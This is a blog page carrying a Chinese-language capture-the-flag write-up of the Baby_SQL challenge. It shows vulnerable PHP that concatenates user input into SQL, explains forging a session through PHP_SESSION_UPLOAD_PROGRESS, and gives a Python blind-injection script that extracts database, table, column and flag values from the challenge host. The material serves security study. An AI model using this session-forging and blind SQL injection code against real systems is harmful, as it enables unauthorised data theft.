@@ -1,0 +1,317 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="odiws">
+
+
+
+
+
+<title>[PwnThyBytes——2019]Baby_SQL | Hexo</title>
+
+
+
+    <link rel="icon" href="/favicon.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+<meta name="generator" content="Hexo 7.0.0"></head>
+
+<body>
+    <script>
+        // this function is used to check current theme before page loaded.
+        (() => {
+            const currentTheme = window.localStorage && window.localStorage.getItem('theme') || '';
+            const isDark = currentTheme === 'dark';
+            const pagebody = document.getElementsByTagName('body')[0]
+            if (isDark) {
+                pagebody.classList.add('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Dark"
+            } else {
+                pagebody.classList.remove('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Light"
+            }
+        })();
+    </script>
+
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">Bentham&#39;s Blog</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">Bentham&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+            <div class="main">
+                <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    var tocbot_timer;
+    var DEPTH_MAX = 6; // 为 6 时展开所有
+    var tocbot_default_config = {
+        tocSelector: '.tocbot-list',
+        contentSelector: '.post-content',
+        headingSelector: 'h1, h2, h3, h4, h5',
+        orderedList: false,
+        scrollSmooth: true,
+        onClick: extend_click,
+    };
+
+    function extend_click() {
+        clearTimeout(tocbot_timer);
+        tocbot_timer = setTimeout(function() {
+            tocbot.refresh(obj_merge(tocbot_default_config, {
+                hasInnerContainers: true
+            }));
+        }, 420); // 这个值是由 tocbot 源码里定义的 scrollSmoothDuration 得来的
+    }
+
+    document.ready(function() {
+        tocbot.init(obj_merge(tocbot_default_config, {
+            collapseDepth: 1
+        }));
+    });
+
+    function expand_toc() {
+        var b = document.querySelector('.tocbot-toc-expand');
+        var expanded = b.getAttribute('data-expanded');
+        expanded ? b.removeAttribute('data-expanded') : b.setAttribute('data-expanded', true);
+        tocbot.refresh(obj_merge(tocbot_default_config, {
+            collapseDepth: expanded ? 1 : DEPTH_MAX
+        }));
+        b.innerText = expanded ? 'Expand all' : 'Collapse all';
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+    function obj_merge(target, source) {
+        for (var item in source) {
+            if (source.hasOwnProperty(item)) {
+                target[item] = source[item];
+            }
+        }
+        return target;
+    }
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">[PwnThyBytes——2019]Baby_SQL</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">odiws</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">October 15, 2024&nbsp;&nbsp;15:34:26</a>
+                        </span>
+                    
+                    
+                        <span class="post-category">
+                    Category:
+                            
+                                <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">学习笔记</a>
+                            
+                        </span>
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <h2 id="PwnThyBytes——2019-Baby-SQL"><a href="#PwnThyBytes——2019-Baby-SQL" class="headerlink" title="[PwnThyBytes——2019]Baby_SQL"></a>[PwnThyBytes——2019]Baby_SQL</h2><p>ctrl+u最下面：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- /source.zip --&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>下载发现&#x2F;template目录下的漏洞：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">!isset($_SESSION) AND die(&quot;Direct access on this script is not allowed!&quot;);</span><br><span class="line">include &#x27;db.php&#x27;;</span><br><span class="line"></span><br><span class="line">$sql = &#x27;SELECT `username`,`password` FROM `ptbctf`.`ptbctf` where `username`=&quot;&#x27; . $_GET[&#x27;username&#x27;] . &#x27;&quot; and password=&quot;&#x27; . md5($_GET[&#x27;password&#x27;]) . &#x27;&quot;;&#x27;;</span><br><span class="line">$result = $con-&gt;query($sql);</span><br></pre></td></tr></table></figure>
+
+<p>前提就是绕过这个isset（$_SESSION）,但是只有regieter和login有SESSION数组只有在session_start()初始化后才产生，所以只能伪造一个session来绕过index，进行sql注入。</p>
+<h4 id="在phpsession里如果在php-ini中设置session-auto-start-On，那么PHP每次处理PHP文件的时候都会自动执行session-start-，但是session-auto-start默认为Off。与Session相关的另一个叫session-upload-progress-enabled，默认为On，在这个选项被打开的前提下我们在multipart-POST的时候传入PHP-SESSION-UPLOAD-PROGRESS，PHP会执行session-start"><a href="#在phpsession里如果在php-ini中设置session-auto-start-On，那么PHP每次处理PHP文件的时候都会自动执行session-start-，但是session-auto-start默认为Off。与Session相关的另一个叫session-upload-progress-enabled，默认为On，在这个选项被打开的前提下我们在multipart-POST的时候传入PHP-SESSION-UPLOAD-PROGRESS，PHP会执行session-start" class="headerlink" title="在phpsession里如果在php.ini中设置session.auto_start&#x3D;On，那么PHP每次处理PHP文件的时候都会自动执行session_start()，但是session.auto_start默认为Off。与Session相关的另一个叫session.upload_progress.enabled，默认为On，在这个选项被打开的前提下我们在multipart POST的时候传入PHP_SESSION_UPLOAD_PROGRESS，PHP会执行session_start()"></a>在phpsession里如果在php.ini中设置session.auto_start&#x3D;On，那么PHP每次处理PHP文件的时候都会自动执行session_start()，但是session.auto_start默认为Off。与Session相关的另一个叫session.upload_progress.enabled，默认为On，在这个选项被打开的前提下我们在multipart POST的时候传入PHP_SESSION_UPLOAD_PROGRESS，PHP会执行session_start()</h4><h4 id="这个方法同样可以用来进行文件包含和反序列化"><a href="#这个方法同样可以用来进行文件包含和反序列化" class="headerlink" title="这个方法同样可以用来进行文件包含和反序列化"></a>这个方法同样可以用来进行文件包含和反序列化</h4><p>直接脚本bp抓包：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://6a742e0c-c6b0-49a3-b626-f5f0578d17f1.node3.buuoj.cn/templates/login.php&quot;</span></span><br><span class="line"></span><br><span class="line">files = &#123;<span class="string">&quot;file&quot;</span>: <span class="string">&quot;123456789&quot;</span>&#125;</span><br><span class="line">a = requests.post(url=url, files=files, data=&#123;<span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span>: <span class="string">&quot;123456789&quot;</span>&#125;,</span><br><span class="line">                  cookies=&#123;<span class="string">&quot;PHPSESSID&quot;</span>: <span class="string">&quot;test1&quot;</span>&#125;, params=&#123;<span class="string">&#x27;username&#x27;</span>: <span class="string">&#x27;test&#x27;</span>, <span class="string">&#x27;password&#x27;</span>: <span class="string">&#x27;test&#x27;</span>&#125;,</span><br><span class="line">                  proxies=&#123;<span class="string">&#x27;http&#x27;</span>: <span class="string">&quot;http://127.0.0.1:8080&quot;</span>&#125;)</span><br><span class="line"><span class="built_in">print</span>(a.text)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/IGotIt/6.png" alt="6"></p>
+<p>返回try again就差不多了</p>
+<p>双引号闭合：</p>
+<p>exp:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">url = <span class="string">&quot;http://6a742e0c-c6b0-49a3-b626-f5f0578d17f1.node3.buuoj.cn/templates/login.php&quot;</span></span><br><span class="line"></span><br><span class="line">files = &#123;<span class="string">&quot;file&quot;</span>: <span class="string">&quot;123456789&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;字段值&#x27;&#x27;&#x27;</span></span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    low = <span class="number">32</span></span><br><span class="line">    high = <span class="number">128</span></span><br><span class="line">    mid = (low+high)//<span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span> (low &lt; high):</span><br><span class="line">        time.sleep(<span class="number">0.06</span>)</span><br><span class="line">        <span class="comment"># payload_flag =&#123;&#x27;username&#x27;: &quot;test\&quot; or (ascii(substr((select group_concat(username) from ptbctf ),&#123;0&#125;,1))&gt;&#123;1&#125;) #&quot;.format(i, mid),&#x27;password&#x27;: &#x27;test&#x27;&#125;</span></span><br><span class="line">        payload_flag = &#123;</span><br><span class="line">            <span class="string">&#x27;username&#x27;</span>: <span class="string">&quot;test\&quot; or (ascii(substr((select group_concat(secret) from flag_tbl ),&#123;0&#125;,1))&gt;&#123;1&#125;) #&quot;</span>.<span class="built_in">format</span>(i,mid),<span class="string">&#x27;password&#x27;</span>: <span class="string">&#x27;test&#x27;</span>&#125;</span><br><span class="line">        r = requests.post(url=url,params=payload_flag,files=files, data=&#123;<span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span>: <span class="string">&quot;123456789&quot;</span>&#125;,</span><br><span class="line">                  cookies=&#123;<span class="string">&quot;PHPSESSID&quot;</span>: <span class="string">&quot;test1&quot;</span>&#125;)</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(payload_flag)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;&lt;meta http-equiv=&quot;refresh&quot; content=&quot;0; url=?p=home&quot; /&gt;&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            low = mid +<span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            high = mid</span><br><span class="line">        mid = (low + high) // <span class="number">2</span></span><br><span class="line">    <span class="keyword">if</span>(mid==<span class="number">32</span> <span class="keyword">or</span> mid == <span class="number">132</span>):</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    flag +=<span class="built_in">chr</span>(mid)</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line"><span class="comment"># column=&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># for i in range(1,100):</span></span><br><span class="line"><span class="comment">#     low = 32</span></span><br><span class="line"><span class="comment">#     high = 128</span></span><br><span class="line"><span class="comment">#     mid = (low+high)//2</span></span><br><span class="line"><span class="comment">#     while (low &lt; high):</span></span><br><span class="line"><span class="comment">#         time.sleep(0.06)</span></span><br><span class="line"><span class="comment">#         payload_column =&#123;&#x27;username&#x27;: &quot;test\&quot; or (ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=\&#x27;flag_tbl\&#x27; ),&#123;0&#125;,1))&gt;&#123;1&#125;) #&quot;.format(i, mid),&#x27;password&#x27;: &#x27;test&#x27;&#125;</span></span><br><span class="line"><span class="comment">#         r = requests.post(url=url,params=payload_column,files=files, data=&#123;&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;: &quot;123456789&quot;&#125;,</span></span><br><span class="line"><span class="comment">#                   cookies=&#123;&quot;PHPSESSID&quot;: &quot;test1&quot;&#125;)</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#         print(payload_column)</span></span><br><span class="line"><span class="comment">#         if &#x27;&lt;meta http-equiv=&quot;refresh&quot; content=&quot;0; url=?p=home&quot; /&gt;&#x27; in r.text:</span></span><br><span class="line"><span class="comment">#             low = mid +1</span></span><br><span class="line"><span class="comment">#         else:</span></span><br><span class="line"><span class="comment">#             high = mid</span></span><br><span class="line"><span class="comment">#         mid = (low + high) // 2</span></span><br><span class="line"><span class="comment">#     if(mid==32 or mid == 132):</span></span><br><span class="line"><span class="comment">#         break</span></span><br><span class="line"><span class="comment">#     column +=chr(mid)</span></span><br><span class="line"><span class="comment">#     print(column)</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># print(column)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># &#x27;&#x27;&#x27;表名&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># table=&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># for i in range(1,100):</span></span><br><span class="line"><span class="comment">#     low = 32</span></span><br><span class="line"><span class="comment">#     high = 128</span></span><br><span class="line"><span class="comment">#     mid = (low+high)//2</span></span><br><span class="line"><span class="comment">#     while (low &lt; high):</span></span><br><span class="line"><span class="comment">#         time.sleep(0.06)</span></span><br><span class="line"><span class="comment">#         payload_table =&#123;&#x27;username&#x27;: &#x27;test&quot; or (ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=\&#x27;ptbctf\&#x27;),&#123;0&#125;,1))&gt;&#123;1&#125;) #&#x27;.format(i, mid),&#x27;password&#x27;: &#x27;test&#x27;&#125;</span></span><br><span class="line"><span class="comment">#         r = requests.post(url=url,params=payload_table,files=files, data=&#123;&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;: &quot;123456789&quot;&#125;,</span></span><br><span class="line"><span class="comment">#                   cookies=&#123;&quot;PHPSESSID&quot;: &quot;test1&quot;&#125;)</span></span><br><span class="line"><span class="comment">#         print(payload_table)</span></span><br><span class="line"><span class="comment">#         if &#x27;&lt;meta http-equiv=&quot;refresh&quot; content=&quot;0; url=?p=home&quot; /&gt;&#x27; in r.text:</span></span><br><span class="line"><span class="comment">#             low = mid +1</span></span><br><span class="line"><span class="comment">#         else:</span></span><br><span class="line"><span class="comment">#             high = mid</span></span><br><span class="line"><span class="comment">#         mid = (low + high) // 2</span></span><br><span class="line"><span class="comment">#     if(mid==32 or mid == 132):</span></span><br><span class="line"><span class="comment">#         break</span></span><br><span class="line"><span class="comment">#     table+=chr(mid)</span></span><br><span class="line"><span class="comment">#     print(table)</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># print(table)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># &#x27;&#x27;&#x27;数据库名&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># database=&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># for i in range(1,100):</span></span><br><span class="line"><span class="comment">#     low = 32</span></span><br><span class="line"><span class="comment">#     high = 128</span></span><br><span class="line"><span class="comment">#     mid = (low+high)//2</span></span><br><span class="line"><span class="comment">#     while (low &lt; high):</span></span><br><span class="line"><span class="comment">#         time.sleep(0.06)</span></span><br><span class="line"><span class="comment">#         payload_database =&#123;&#x27;username&#x27;: &#x27;test&quot; or (ascii(substr((select database()),&#123;0&#125;,1))&gt;&#123;1&#125;) #&#x27;.format(i, mid),&#x27;password&#x27;: &#x27;test&#x27;&#125;</span></span><br><span class="line"><span class="comment">#         r = requests.post(url=url,params=payload_database,files=files, data=&#123;&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;: &quot;123456789&quot;&#125;,</span></span><br><span class="line"><span class="comment">#                   cookies=&#123;&quot;PHPSESSID&quot;: &quot;test1&quot;&#125;)</span></span><br><span class="line"><span class="comment">#         print(payload_database)</span></span><br><span class="line"><span class="comment">#         if &#x27;&lt;meta http-equiv=&quot;refresh&quot; content=&quot;0; url=?p=home&quot; /&gt;&#x27; in r.text:</span></span><br><span class="line"><span class="comment">#             low = mid +1</span></span><br><span class="line"><span class="comment">#         else:</span></span><br><span class="line"><span class="comment">#             high = mid</span></span><br><span class="line"><span class="comment">#         mid = (low + high) // 2</span></span><br><span class="line"><span class="comment">#     if(mid==32 or mid == 132):</span></span><br><span class="line"><span class="comment">#         break</span></span><br><span class="line"><span class="comment">#     database+=chr(mid)</span></span><br><span class="line"><span class="comment">#     print(database)</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># print(database)</span></span><br></pre></td></tr></table></figure>
+
+<p>参考链接：<a target="_blank" rel="noopener" href="https://blog.csdn.net/SopRomeo/article/details/108967248">https://blog.csdn.net/SopRomeo/article/details/108967248</a></p>
+
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                    <p class="copyright-item">
+                        <span>Author:</span>
+                        <span>odiws</span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>Permalink:</span>
+                        <span><a href="http://odiws.github.io/2024/10/15/PwnThyBytes%E2%80%94%E2%80%942019-Baby-SQL/">http://odiws.github.io/2024/10/15/PwnThyBytes%E2%80%94%E2%80%942019-Baby-SQL/</a></span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>License:</span>
+                        <span>Copyright (c) 2019 <a target="_blank" rel="noopener" href="http://creativecommons.org/licenses/by-nc/4.0/">CC-BY-NC-4.0</a> LICENSE</span>
+                    </p>
+                
+                
+                     <p class="copyright-item">
+                         <span>Slogan:</span>
+                         <span>Do you believe in <strong>DESTINY</strong>?</span>
+                     </p>
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="/tags/buuctf/"># buuctf</a>
+                    
+                        <a href="/tags/session%E4%BC%AA%E9%80%A0/"># session伪造</a>
+                    
+                        <a href="/tags/sql%E7%9B%B2%E6%B3%A8/"># sql盲注</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+                <a class="prev" rel="prev" href="/2024/10/15/SWPU2019-Web3/">[SWPU2019]Web3</a>
+            
+            
+            <a class="next" rel="next" href="/2024/10/15/HarekazeCTF2019-EasyNotes-1/">[HarekazeCTF2019]EasyNotes</a>
+            
+        </section>
+
+
+    </article>
+</div>
+
+            </div>
+            <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© odiws | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+</footer>
+
+    </div>
+</body>
+
+</html>
